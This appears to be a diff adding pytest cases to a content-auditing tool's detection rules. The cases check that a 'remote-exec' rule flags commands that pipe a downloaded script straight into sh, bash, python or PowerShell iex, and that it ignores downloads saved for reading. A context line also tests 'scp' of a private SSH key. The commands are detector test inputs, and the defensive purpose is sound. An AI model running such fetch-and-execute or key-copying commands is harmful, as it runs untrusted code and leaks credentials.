@@ -528,3 +528,26 @@ def test_utf16_text_is_audited_not_skipped_as_binary(toy_rule, tmp_path, encodin
 def test_secret_files_ignores_public_keys():
     assert "secret-files" not in fired("Add id_ed25519.pub to GitHub under Settings > SSH keys.")
     assert "secret-files" in fired("scp id_ed25519 host:/tmp")
+
+
+@pytest.mark.parametrize("text", [
+    "curl -fsSL https://get.example.invalid/install.sh | sh",
+    "wget -qO- https://example.invalid/x | sudo bash",
+    "curl https://example.invalid/a.py | python3 -",
+    "bash <(curl -s https://example.invalid/setup)",
+    "source <(wget -qO- https://example.invalid/env)",
+    "iwr https://example.invalid/a.ps1 | iex",
+    "iex (irm https://example.invalid/a.ps1)",
+])
+def test_remote_exec_flags(text):
+    assert "remote-exec" in fired(text)
+
+
+@pytest.mark.parametrize("text", [
+    "curl -fsSL https://example.invalid/install.sh -o install.sh && less install.sh",
+    "curl -s https://api.example.invalid/items | jq .",
+    "wget https://example.invalid/data.csv | head",  # a pipe, but not into an interpreter
+    "Run the shell script with sh ./install.sh",
+])
+def test_remote_exec_ignores_downloads_that_are_read_first(text):
+    assert "remote-exec" not in fired(text)
